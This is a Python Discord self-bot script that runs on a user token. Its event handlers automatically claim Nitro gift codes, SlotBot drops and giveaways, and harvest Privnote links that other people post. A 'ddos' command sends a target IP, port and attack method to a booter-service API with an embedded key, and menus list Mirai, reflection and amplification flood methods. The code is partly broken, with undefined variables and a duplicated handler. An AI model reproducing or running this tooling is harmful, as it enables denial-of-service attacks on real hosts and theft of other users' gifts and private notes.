


token = ""
prefix = "1337"

import discord, subprocess, sys, time, os, colorama, base64, codecs, datetime, io, random, numpy, datetime, smtplib, string, ctypes
import urllib.parse, urllib.request, re, json, requests, webbrowser, aiohttp, dns.name, asyncio, functools, logging

from discord.ext import (
    commands,
    tasks
)
from bs4 import BeautifulSoup as bs4
from urllib.parse import urlencode
from pymongo import MongoClient
from selenium import webdriver
from threading import Thread
from subprocess import call
from itertools import cycle
from colorama import Fore
from sys import platform
from PIL import Image
import pyPrivnote as pn
from gtts import gTTS
import nekos
import sys
import os
import psutil
import logging
import time
from colorama import Fore, Back, Style
from colorama import init as cinit
cinit()
from socket import gethostbyname
client = discord.Client()
giveaway_sniper = True
slotbot_sniper = True
nitro_sniper = True
privnote_sniper = True
###SNIPER
@client.event
async def on_message(message):

    def GiveawayData():
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
    +Fore.RESET)

    def SlotBotData():
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
    +Fore.RESET)

    def NitroData(elapsed, code):
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
        f"\n{Fore.WHITE} - AUTHOR: {Fore.YELLOW}[{message.author}]"
        f"\n{Fore.WHITE} - ELAPSED: {Fore.YELLOW}[{elapsed}]"
        f"\n{Fore.WHITE} - CODE: {Fore.YELLOW}{code}"
    +Fore.RESET)

    def PrivnoteData(code):
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
        f"\n{Fore.WHITE} - CONTENT: {Fore.YELLOW}[The content can be found at Privnote/{code}.txt]"
    +Fore.RESET)

    time = datetime.datetime.now().strftime("%H:%M %p")
    if 'discord.gift/' in message.content:
        if nitro_sniper == True:
            start = datetime.datetime.now()
            code = re.search("discord.gift/(.*)", message.content).group(1)


            headers = {'Authorization': token}
            r = requests.post(
                f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem',
                headers=headers,
            ).text

            elapsed = datetime.datetime.now() - start
            elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'

            if 'This gift has been redeemed already.' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Already Redeemed]"+Fore.RESET)
                NitroData(elapsed, code)

            elif 'subscription_plan' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Success]"+Fore.RESET)
                NitroData(elapsed, code)

            elif 'Unknown Gift Code' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Unknown Gift Code]"+Fore.RESET)
                NitroData(elapsed, code)
        else:
            return

    if 'Someone just dropped' in message.content:
        if slotbot_sniper == True:
            if message.author.id == 346353957029019648:
                try:
                    await message.channel.send('~grab')
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.CYAN}[{time} - SlotBot Couldnt Grab]"+Fore.RESET)
                    SlotBotData()
                print(""
                f"\n{Fore.CYAN}[{time} - Slotbot Grabbed]"+Fore.RESET)
                SlotBotData()
        else:
            return

    if 'GIVEAWAY' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:
                try:
                    await message.add_reaction("🎉")
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.CYAN}[{time} - Giveaway Couldnt React]"+Fore.RESET)
                    GiveawayData()
                print(""
                f"\n{Fore.CYAN}[{time} - Giveaway Sniped]"+Fore.RESET)
                GiveawayData()
        else:
            return

    if f'Congratulations <@{client.user.id}>' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:
                print(""
                f"\n{Fore.CYAN}[{time} - Giveaway Won]"+Fore.RESET)
                GiveawayData()
        else:
            return

    if 'privnote.com' in message.content:
        if privnote_sniper == True:
            code = re.search('privnote.com/(.*)', message.content).group(1)
            link = 'https://privnote.com/'+code
            try:
                note_text = pn.read_note(link)
            except Exception as e:
                print(e)
            with open(f'Privnote/{code}.txt', 'a+') as f:
                print(""
                f"\n{Fore.CYAN}[{time} - Privnote Sniped]"+Fore.RESET)
                PrivnoteData(code)
                f.write(note_text)
        else:
            return
    await L337.process_commands(message)
L337 = discord.Client()
##COMMANDS
@client.event
async def on_message(message):
    global prefix
    prefix = prefix
    if message.author == client.user:
        commands = []
        z = 0
        for index, a in enumerate(message.content):
            if a == " ":
                commands.append(message.content[z:index])
                z = index + 1
        commands.append(message.content[z:])

        channel = message.channel
#####################################################################################################################################################
#    0xH3LP
#####################################################################################################################################################
        if commands[0] == ""+prefix+"help":
            print(Style.BRIGHT + Fore.RED +"Discord: "+Style.BRIGHT + Fore.GREEN + prefix+"help")
            await message.delete()
            container = discord.Embed(title="__**L337 SelfBot!**__", colour=0x000000)
            container.set_thumbnail(url="http://l337.cc/background.gif")
            container.set_author(name="Developed By Sadtrash", icon_url="http://l337.cc/background.gif")
            container.add_field(name="**Account Tools**", value="Usage:"+prefix+"account", inline=True)
            #container.add_field(name="**Menu Tools**", value="Usage:"+prefix+"menutools", inline=True)
            container.add_field(name="**Status Tools**", value="Usage:"+prefix+"stattools", inline=True)
            #container.add_field(name="**Terminal Tools**", value="Usage:"+prefix+"terminal", inline=True)
            container.add_field(name="**DDoS Tools**", value="Usage:"+prefix+"ddos", inline=True)
            container.add_field(name="**FUN**", value="Usage:"+prefix+"fun", inline=True)
            #container.add_field(name="**The Homies**", value="Usage:"+prefix+"homies", inline=True)
            #container.add_field(name="**Image List**", value="Usage:"+prefix+"images", inline=True)
            #container.add_field(name="**Link List**", value="Usage:"+prefix+"links", inline=True)
            #container.add_field(name="**Available Games**", value="Usage:"+prefix+"games", inline=True)
            container.set_footer(text="L337.CC ", icon_url="http://l337.cc/background.gif")
            await channel.send(embed=container)

#######################################################################################################################################################
##### 0xM2G2
#######################################################################################################################################################
        if commands[0] == ""+prefix+"fun":
            print(Style.BRIGHT + Fore.RED +"Discord: "+Style.BRIGHT + Fore.GREEN + prefix+"fun")
            await message.delete()
            container = discord.Embed(title="__**L337 FUN List**__", color=0x000000)
            container.set_thumbnail(url="http://l337.cc/background.gif")
            container.add_field(name="**Pat a user!**", value="Usage:"+prefix+"pat [USER]", inline=True)
            container.add_field(name="**Hugs a user**", value="Usage:"+prefix+"hug [USER]", inline=True)
            container.add_field(name="**Kisses a user**", value="Usage:"+prefix+"kiss [USER]", inline=True)
            container.add_field(name="**Licks a user**", value="Usage:"+prefix+"lick [USER]", inline=True)
            container.add_field(name="**Tickle a user**", value="Usage:"+prefix+"nsfw", inline=True)
            container.add_field(name="**NSFW**", value="Usage:"+prefix+"nsfw [USER]", inline=True)
            container.set_footer(text="L337.CC ", icon_url="http://l337.cc/background.gif")
            await channel.send(embed=container)

        if commands[0] == ""+prefix+"pat":
            await message.delete()
            if (message.mentions.__len__()>0):
                for user in message.mentions:
                    e = discord.Embed()
                    e.color=0x000000
                    pat = nekos.img("pat")
                    e.title='{0} has patted! {1}'.format(client.user, user)
                    e.set_image(url=pat)
                    await channel.send(embed=e)
                    print("{0}[+] Used Fun Command (Pat){1}".format(Fore.GREEN, Fore.RESET))

        if commands[0] == ""+prefix+"hug":
            await message.delete()
            if (message.mentions.__len__()>0):
                for user in message.mentions:
                    e = discord.Embed()
                    e.color=0x000000
                    hug = nekos.img("hug")
                    e.title='{0} has hugged {1}'.format(client.user, user)
                    e.set_image(url=hug)
                    await channel.send(embed=e)
                    print("{0}[+] Used Fun Command (hug){1}".format(Fore.GREEN, Fore.RESET))

        if commands[0] == ""+prefix+"kiss":
            await message.delete()
            if (message.mentions.__len__()>0):
                for user in message.mentions:
                    e = discord.Embed()
                    e.color=0x000000
                    kiss = nekos.img("kiss")
                    e.title='{0} has kissed {1}'.format(client.user, user)
                    e.set_image(url=kiss)
                    await channel.send(embed=e)
                    print("{0}[+] Used Fun Command (kiss){1}".format(Fore.GREEN, Fore.RESET))

        if commands[0] == ""+prefix+"lick":
            await message.delete()
            if (message.mentions.__len__()>0):
                for user in message.mentions:
                    e = discord.Embed()
                    e.color=0x000000
                    e.title='{0} has Licked! {1}'.format(client.user, user)
                    e.set_image(url="https://media1.tenor.com/images/efd46743771a78e493e66b5d26cd2af1/tenor.gif?itemid=14002773")
                    await channel.send(embed=e)
                    print("{0}[+] Used Fun Command (Lick){1}".format(Fore.GREEN, Fore.RESET))

        if commands[0] == ""+prefix+"tickle":
            await message.delete()
            if (message.mentions.__len__()>0):
                for user in message.mentions:
                    e = discord.Embed()
                    e.color=0x000000
                    tickle = nekos.img("tickle")
                    e.title='{0} has Tickled! {1}'.format(client.user, user)
                    e.set_image(url=tickle)
                    await channel.send(embed=e)
                    print("{0}[+] Used Fun Command (Tickle){1}".format(Fore.GREEN, Fore.RESET))


################################################################################################################################
        if commands[0] == ""+prefix+"nsfw":
            print(Style.BRIGHT + Fore.RED +"Discord: "+Style.BRIGHT + Fore.GREEN + prefix+"nsfw")
            await message.delete()
            container = discord.Embed(title="__**L337 NSFW List**__", color=0x000000)
            container.set_thumbnail(url="http://l337.cc/background.gif")
            #container.add_field(name="**Pat a user!**", value="Usage:"+prefix+"pat [USER]", inline=True)
            #container.add_field(name="**Hugs a user**", value="Usage:"+prefix+"hug [USER]", inline=True)
            container.add_field(name="**Anal**", value="Usage:"+prefix+"anal", inline=True)
            container.add_field(name="**Feet**", value="Usage:"+prefix+"feet", inline=True)
            container.add_field(name="**Blowjob**", value="Usage:"+prefix+"bj or blowjob", inline=True)
            container.add_field(name="**Hentai**", value="Usage:"+prefix+"hentai", inline=True)
            container.add_field(name="**Trap**", value="Usage:"+prefix+"trap", inline=True)
            container.set_footer(text="L337.CC ", icon_url="http://l337.cc/background.gif")
            await channel.send(embed=container)

        if commands[0] == ""+prefix+"hentai":
            await message.delete()
            e = discord.Embed()
            e.color=0x000000
            hentai = nekos.img("hentai")
            e.title='hentai :flushed: '.format()
            e.set_image(url=hentai)
            await channel.send(embed=e)
            print("{0}[+] Used NSFW Command (hentai){1}".format(Fore.GREEN, Fore.RESET))

        if commands[0] == ""+prefix+"bj":
            await message.delete()
            e = discord.Embed()
            e.color=0x000000
            bj = nekos.img("bj")
            e.title='bj :flushed: '.format()
            e.set_image(url=bj)
            await channel.send(embed=e)
            print("{0}[+] Used NSFW Command (blowjob){1}".format(Fore.GREEN, Fore.RESET))
        if commands[0] == ""+prefix+"blowjob":
            await message.delete()
            e = discord.Embed()
            e.color=0x000000
            blowjob = nekos.img("blowjob")
            e.title='blowjob :flushed: '.format()
            e.set_image(url=blowjob)
            await channel.send(embed=e)
            print("{0}[+] Used NSFW Command (blowjob){1}".format(Fore.GREEN, Fore.RESET))

        if commands[0] == ""+prefix+"anal":
            await message.delete()
            e = discord.Embed()
            e.color=0x000000
            anal = nekos.img("anal")
            e.title='anal :flushed: '.format()
            e.set_image(url=anal)
            await channel.send(embed=e)
            print("{0}[+] Used NSFW Command (anal){1}".format(Fore.GREEN, Fore.RESET))

        if commands[0] == ""+prefix+"feet":
            await message.delete()
            e = discord.Embed()
            e.color=0x000000
            feet = nekos.img("feet")
            e.title='feet :flushed: '.format()
            e.set_image(url=feet)
            await channel.send(embed=e)
            print("{0}[+] Used NSFW Command (anal){1}".format(Fore.GREEN, Fore.RESET))

        if commands[0] == ""+prefix+"trap":
            await message.delete()
            e = discord.Embed()
            e.color=0x000000
            trap = nekos.img("trap")
            e.title='trap :flushed: '.format()
            e.set_image(url=trap)
            await channel.send(embed=e)
            print("{0}[+] Used NSFW Command (trap){1}".format(Fore.GREEN, Fore.RESET))

################################################################################################################################
################################################################################################################################
################################################################################################################################


        # status tools menu
        if commands[0] == ""+prefix+"stattools":
            print(Style.BRIGHT + Fore.RED +"Discord: "+Style.BRIGHT + Fore.GREEN + prefix+"stattools")
            await message.delete()
            container = discord.Embed(title="__**L337 StatTool List**__", color=0x000000)
            container.set_thumbnail(url="http://l337.cc/background.gif")
            container.add_field(name="**Playing Status Changer**", value="Usage:"+prefix+"playing [NAME/WORD]", inline=False)
            container.add_field(name="**Watching Status Changer**", value="Usage:"+prefix+"watching [NAME/WORD]", inline=False)
            container.add_field(name="**Streaming Status Changer**", value="Usage:"+prefix+"streaming [QUOTEDWORD] [LINK]", inline=False)
            container.add_field(name="**Reset Status**", value="Usage:"+prefix+"resetstatus", inline=False)
            container.set_footer(text="L337.CC ", icon_url="http://l337.cc/background.gif")
            await channel.send(embed=container)

        # Playing $INPUT
        if commands[0] == ""+prefix+"playing":
                msg = message.content.split(""+prefix+"playing ", 1)
                name = msg[1]
                await message.delete()
                await client.change_presence(status=discord.Status.dnd, activity=discord.Activity(name=name, type=discord.ActivityType.playing, details="Doin Drugs", state="Created with love By Cri#4344 c;", assets="https://i.imgur.com/5bd3F42.png"))
                container = discord.Embed(title="__**Status Tool**__", color=0x000000)
                container.add_field(name="**Status set to:**", value="Playing "+name+".")
                container.set_footer(text="L337.CC ", icon_url="http://l337.cc/background.gif")
                await channel.send(embed=container)

        # Streaming $INPUT
        if commands[0] == ""+prefix+"streaming":
                if len(commands) <= 3:
                        msg = message.content.split(""+prefix+"streaming ", 1)
                        args = msg[1].split(" http", 1)
                        name = args[0]
                        url = "http"+args[1]
                        await message.delete()
                        await client.change_presence(status=discord.Status.dnd, activity=discord.Streaming(name=name, url=url))
                        container = discord.Embed(title="__**Status Tool**__", color=0x000000)
                        container.add_field(name="**Status set to:**", value="Streaming "+name+".")
                        container.set_footer(text="L337.CC ", icon_url="http://l337.cc/background.gif")
                        await channel.send(embed=container)
                else:
                        await message.delete()
                        container = discord.Embed(title="__**Status Tool**__", color=0x000000)
                        container.add_field(name="**Usage:**", value=""+prefix+"streaming [name] [url]")
                        container.add_field(name="**Example:**", value=""+prefix+"streaming 'video game' https://twitch.tv/streamer", inline=False)
                        container.set_footer(text="L337.CC ", icon_url="http://l337.cc/background.gif")
                        await channel.send(embed=container)

        # Watching $INPUT
        if commands[0] == ""+prefix+"watching":
                msg = message.content.split(""+prefix+"watching ", 1)
                name = msg[1]
                await message.delete()
                await client.change_presence(status=discord.Status.dnd, activity=discord.Activity(name=name, type=discord.ActivityType.watching, details="Spamtec v1.0.1 Selfbot", state="Created with love By Cri#4344 c;"))
                await channel.send("Status set to: \"Watching "+name+"\".")

        # Reset Presence
        if commands[0] == ""+prefix+"resetstatus":
                await message.delete()
                await client.change_presence(status=discord.Status.dnd)
                await channel.send("Status reset.")
################################################################################################################################

        # Attack Input/Output
        if commands[0] == ""+prefix+"ddos":
            print(Style.BRIGHT + Fore.RED +"Discord: "+Style.BRIGHT + Fore.GREEN + prefix+"ddos")
            if len(commands) == 5:
                await message.delete()
                api = requests.get("https://api.supremesecurityteam.com/index.php?page=Api&key=thgbuejeb6k6xe0&host="+commands[1]+"&port="+commands[2]+"&time="+commands[3]+"&method="+commands[4].upper())
                api2 = requests.get(""+supremeapi+""+supremeapi2+"&host="+commands[1]+"&port="+commands[2]+"&time="+commands[3]+"&method="+commands[4].upper())
                container = discord.Embed(title="__**Attack Started!**__", color=0x000000)
                container.set_thumbnail(url="http://l337.cc/background.gif")
                container.add_field(name="IP", value=commands[1], inline=True)
                container.add_field(name="Port:", value=commands[2], inline=True)
                container.add_field(name="Time:", value=commands[3], inline=True)
                container.add_field(name="Method:", value=commands[4], inline=True)
                container.add_field(name="**Open Ports:**:", value=""+api4.text+"", inline=False)
                container.add_field(name="**Geolocation Results:**", value="c;", inline=False)
                container.add_field(name="**IP:**", value=commands[1], inline=False)
                #if data["reverse"] != "":
                container.add_field(name="**Hostname:**", value=data["reverse"], inline=False)
                container.add_field(name="**ISP:**", value=data["as"], inline=False)
                container.add_field(name="**City**:", value=data["city"], inline=True)
                container.add_field(name="**State/Region:**", value=data["regionName"], inline=True)
                container.add_field(name="**ZIP:**", value=data["zip"], inline=True)
                container.add_field(name="**Country:**", value=data["country"], inline=True)
                container.set_footer(text="L337.CC ", icon_url="http://l337.cc/background.gif")
                print("=============================================================")
                print("User:", client.user.name +'#'+ client.user.discriminator, "Ran tool: "+prefix+"ddos\ninput="+prefix+"ddos "+commands[1]+" "+commands[2]+" "+commands[3]+" "+commands[4]+"")
                print("=============================================================")
                await channel.send(embed=container)

            if len(commands) == 2 and commands[1] == "methodlist":
                print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"Discord: "+ Style.BRIGHT + Fore.RED + Back.BLACK +prefix+"ddos methodlist")
                await message.delete()
                container = discord.Embed(title="__**L337 Attack API**__", color=0x000000)
                container.set_thumbnail(url="http://l337.cc/background.gif")
                container.add_field(name="**UDP Methods**", value="Usage:"+prefix+"ddos udp", inline=True)
                container.add_field(name="**TCP Methods**", value="Usage:"+prefix+"ddos tcp", inline=True)
                container.add_field(name="**Supreme Methods**", value="Usage:"+prefix+"ddos supreme", inline=True)
                container.add_field(name="**Arceus Methods**", value="Usage:"+prefix+"ddos arceus", inline=True)
                container.add_field(name="**Mirai Methods**", value="Usage:"+prefix+"ddos mirai", inline=True)
                container.add_field(name="**C2 Methods**", value="Usage:"+prefix+"ddos c2", inline=True)
                container.add_field(name="**Reflection Methods**", value="Usage:"+prefix+"ddos reflection", inline=True)
                container.add_field(name="**Bandwidth Methods**", value="Usage:"+prefix+"ddos bandwidth", inline=True)
                container.add_field(name="**Yubina Methods**", value="Usage:"+prefix+"ddos yubina", inline=True)
                container.add_field(name="**Custom Methods**", value="Usage:"+prefix+"ddos custom", inline=True)
                container.add_field(name="**Connected APIs**", value="Usage:"+prefix+"ddos apis", inline=True)
                container.set_footer(text="L337.CC ", icon_url="http://l337.cc/background.gif")
                await channel.send(embed=container)

            if len(commands) == 2 and commands[1] == "apis":
                print(Style.BRIGHT + Fore.RED +"Discord: "+Style.BRIGHT + Fore.GREEN + prefix+"ddos apis")
                await message.delete()
                container = discord.Embed(title="__**API Connection List**__", color=0x000000)
                container.set_thumbnail(url="http://l337.cc/background.gif")
                container.add_field(name="**Connected:**", value="supremesecurityteam.api Connected APIs:[**2**]", inline=True)
                container.add_field(name="**Connected:**", value="arceus.cf.api Connected APIs:[**2**]", inline=True)
                container.add_field(name="**Connected:**", value="defcon.nl.api Connected APIs:[**0**]", inline=True)
                container.set_footer(text="L337.CC ", icon_url="http://l337.cc/background.gif")
                await channel.send(embed=container)

            if len(commands) == 2 and commands[1] == "udp":
                print(Style.BRIGHT + Fore.RED +"Discord: "+Style.BRIGHT + Fore.GREEN + prefix+"ddos udp")
                await message.delete()
                container = discord.Embed(title="__**UDP Attack Methods**__", color=0x000000)
                container.set_thumbnail(url="http://l337.cc/background.gif")
                container.add_field(name="**UDP Methods**", value="UDP-ABUSE\nSUDP\nDNS\nMDNS\nLDAP", inline=True)
                container.add_field(name="**UDP Methods**", value="MSSQL\nMEMCACHED\nNETBIOS\nNTP\nNTPv2\nSNMP\nSSDP", inline=True)
                container.set_footer(text="L337.CC ", icon_url="http://l337.cc/background.gif")
                await channel.send(embed=container)

            if len(commands) == 2 and commands[1] == "tcp":
                print(Style.BRIGHT + Fore.RED +"Discord: "+Style.BRIGHT + Fore.GREEN + prefix+"ddos tcp")
                await message.delete()
                container = discord.Embed(title="__**TCP Attack Methods**__", color=0x000000)
                container.set_thumbnail(url="http://l337.cc/background.gif")
                container.add_field(name="**TCP Methods**", value="TCP-ABUSE\nTCP-ACK\nTCP-FIN\nTCP-PSH\nTCP-RST\nTCP-SYN\nTCP-SEW\nTCP-URG\nXMAS\nZAP\nTELNET\nTCP-XMAS")
                container.set_footer(text="L337.CC ", icon_url="http://l337.cc/background.gif")
                await channel.send(embed=container)

            if len(commands) == 2 and commands[1] == "supreme":
                print(Style.BRIGHT + Fore.RED +"Discord: "+Style.BRIGHT + Fore.GREEN + prefix+"ddos supreme")
                await message.delete()
                container = discord.Embed(title="__**Supreme Attack Methods**__", color=0x000000)
                container.set_thumbnail(url="http://l337.cc/background.gif")
                container.add_field(name="**Supreme Methods**", value="DNS\nNTP\nSNMP\nCLDAP\nMEMCACHE\nUDPKILL\nUDPRAND\nXSYN\nXACK\nXMAS\nTCP-AMP\nSOURCE\nTCPKILL\nARMA3\nOpenVPN\nUBNT\nPPTP\nGRENADE\nIPX\nVOX\nSWTCP\nSETCP\nOVHUDP")
                container.set_footer(text="L337.CC ", icon_url="http://l337.cc/background.gif")
                await channel.send(embed=container)

            if len(commands) == 2 and commands[1] == "reflection":
                print(Style.BRIGHT + Fore.RED +"Discord: "+Style.BRIGHT + Fore.GREEN + prefix+"ddos reflection")
                await message.delete()
                container = discord.Embed(title="__**Reflection Based Attack Methods**__", color=0x000000)
                container.set_thumbnail(url="http://l337.cc/background.gif")
                container.add_field(name="**Reflection Methods**", value="LDAP\nNTP\nTFTP\nSSDP\nPORTMAP\nCHARGEN\nSENTINEL\nNETBIOS\nMSSQL\nTS3\nDNS\nMDNS\nDB2\nARCEUS\nECHO\nSNMP\nMEMCACHE\nRIP\nREAPER\nHEARTBEAT")
                container.set_footer(text="L337.CC ", icon_url="http://l337.cc/background.gif")
                await channel.send(embed=container)

            if len(commands) == 2 and commands[1] == "c2":
                print(Style.BRIGHT + Fore.RED +"Discord: "+Style.BRIGHT + Fore.GREEN + prefix+"ddos c2")
                await message.delete()
                container = discord.Embed(title="__**C2/Bashlite Based Attack Methods**__", color=0x000000)
                container.set_thumbnail(url="http://l337.cc/background.gif")
                container.add_field(name="**C2 Methods**", value="UDP\nTCP\nLYNX\nVSE\nRAID\nHOME\nSTD\nJUNK\nCOMBO\nSTOMP\nCRUSH\nUNKNOWN\nCNC\nSMITE\nACK\nHEX\nCRASH")
                container.set_footer(text="L337.CC ", icon_url="http://l337.cc/background.gif")
                await channel.send(embed=container)

            if len(commands) == 2 and commands[1] == "mirai":
                print(Style.BRIGHT + Fore.RED +"Discord: "+Style.BRIGHT + Fore.GREEN + prefix+"ddos mirai")
                await message.delete()
                container = discord.Embed(title="__**Mirai Based Attack Methods**__", color=0x000000)
                container.set_thumbnail(url="http://l337.cc/background.gif")
                container.add_field(name="**Mirai Methods**", value="RAWUDP\nACK\nSTOMP\nDNS\nVSE\nSYN\nUDPPLAIN\nSTD\nXMAS\nUDP\nGREETH\nGREIP\nOVHBYPASS\nLYNX\nFRAG\nASYN\nHTTP\nPLAI\nUSYN\nTCP")
                container.set_footer(text="L337.CC ", icon_url="http://l337.cc/background.gif")
                await channel.send(embed=container)
            else:
                await message.delete()
                container = discord.Embed(title="__**Error!**__", color=0x000000)
                container.set_thumbnail(url="http://l337.cc/background.gif")
                container.add_field(name="Error!", value="Usage: "+ prefix +"ddostools attack [ip] [port] [time] [method]\nTo list the avaliable methods, type: "+ prefix +"ddos methodlist")
                container.set_footer(text="L337.CC ", icon_url="http://l337.cc/background.gif")
                await channel.send(embed=container)

################################################################################################################################

        # Subdomain scanner v2
        if commands[0] == str(prefix) + "subscan2":
                await message.delete()
                count = 0
                if len(commands) == 2:
                        target = commands[1]
                        containerA = discord.Embed(title="**Subdomain Scanner**", color=0x000000)
                        for sub in subdomains:
                                try:
                                        host = str(sub) + "." + str(target)
                                        ip = gethostbyname(str(host))
                                        count = count + 1
                                        containerA.add_field(name=str(count) + ":", value=str(host + ":" + ip))
                                except:
                                        pass
                        containerA.set_footer(text="Created with love by Georgia Cri#4337 & Rajesh#5919", icon_url="http://l337.cc/background.gif")
                        await channel.send(embed=containerA)

################################################################################################################################

        if commands[0] == ""+prefix+"menutools":
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"Discord: "+ Style.BRIGHT + Fore.WHITE + Back.BLACK + prefix+"menutools")
            await message.delete()
            container = discord.Embed(title="__**L337 Menu Tool List**__", color=0x000000)
            container.set_thumbnail(url="http://l337.cc/background.gif")
            container.add_field(name="**Prefix Changer**", value="Usage:"+prefix+"prefix [INPUT]", inline=True)
            container.set_footer(text="L337.CC ", icon_url="http://l337.cc/background.gif")
            await channel.send(embed=container)

################################################################################################################################

        # MASS DELETE OWN MESSAGES
        if commands[0] == ""+prefix+"illegal":
            print(Style.BRIGHT + Fore.RED +"Discord: "+Style.BRIGHT + Fore.GREEN + prefix+"illegal")
            if len(commands) == 1:
                async for msg in channel.history(limit=9999):
                    if msg.author == client.user:
                        try:
                            await msg.delete()
                        except Exception as x:
                            pass
            elif len(commands) == 2:
                user_id = ''
                for channel in client.private_channels:
                    if commands[1] in str(channel):
                        if str(channel.type) == 'private':
                            user_id = str(channel.id)
                async for msg in channel.history(limit=9999):
                    if msg.author == client.user:
                        try:
                            await msg.delete()
                        except Exception as x:
                            pass

################################################################################################################################

        if commands[0] == ""+prefix+"account":
            print(Style.BRIGHT + Fore.RED +"Discord: "+Style.BRIGHT + Fore.GREEN + prefix+"account")
            await message.delete()
            container = discord.Embed(title="__**L337 Account Tools**__", color=0x000000)
            container.set_thumbnail(url="http://l337.cc/background.gif")
            #container.add_field(name="**Add Any Skype Account To Profile**", value="Usage:"+prefix+"addskype [USERNAME]", inline=False)
            #container.add_field(name="**Add Any LeagueOfLegends Account To Profile**", value="Usage:"+prefix+"addleague [USERNAME]", inline=False)
            container.add_field(name="**Playing Status Changer**", value="Usage:"+prefix+"playing [NAME/WORD]", inline=False)
            container.add_field(name="**Watching Status Changer**", value="Usage:"+prefix+"watching [NAME/WORD]", inline=False)
            container.add_field(name="**Streaming Status Changer**", value="Usage:"+prefix+"streaming [QUOTEDWORD] [LINK]", inline=False)
            container.add_field(name="**Reset User Status**", value="Usage:"+prefix+"resetstatus", inline=False)
            container.set_footer(text="L337.CC", icon_url="http://l337.cc/background.gif")
            await channel.send(embed=container)



client.run(token, bot=False)
